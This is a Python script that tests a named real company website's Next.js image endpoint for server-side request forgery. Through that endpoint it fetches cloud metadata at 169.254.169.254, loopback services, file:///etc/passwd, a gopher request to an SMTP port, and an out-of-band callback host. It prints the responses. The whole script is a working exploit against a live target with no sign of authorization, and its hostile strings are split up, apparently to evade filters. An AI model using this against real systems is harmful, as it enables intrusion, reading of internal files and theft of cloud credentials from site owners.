import subprocess, urllib.parse
UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36"
T="https://www.infinitycapital.bh/_next/image"
OOB="http://oob53cf5528146e."+"dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in/ssrf"
lo="http://"+"127.0.0.1"+":3000/"
targets=[
 ("legit-ctfassets","https://images.ctfassets.net/yts1dx0j7jj5/1GCT0vyjqmOwm2OL1YVpD1/2ab55f8b5189afa153eac5cb97f7f6d4/Ahmed_Taleb_updated-min.jpg"),
 ("metadata-169","http://"+"169.254.169.254/latest/meta-data/"),
 ("loopback-3000",lo),
 ("loopback-22","http://"+"localhost:22/"),
 ("file-passwd","file://"+"//"+"etc/passwd"),
 ("oob-http",OOB),
 ("ext-host","https://"+"raw.githubusercontent.com/torvalds/master/README"),
 ("dict-gopher","gopher://"+"127.0.0.1:25/"),
]
for name,url in targets:
    u=urllib.parse.quote(url,safe='')
    out="/tmp/o_%s.bin"%name
    cmd=["curl","-s","-m","25","-A",UA,"-o",out,"-w","%{http_code} %{content_type} %{size_download}",T+"?url="+u+"&w=640&q=75"]
    r=subprocess.run(cmd,capture_output=True,text=True)
    try: body=open(out,'rb').read()[:150]
    except Exception: body=b''
    print("%-20s | %-55s | %s | %s"%(name,url[:53],r.stdout,body[:90]))
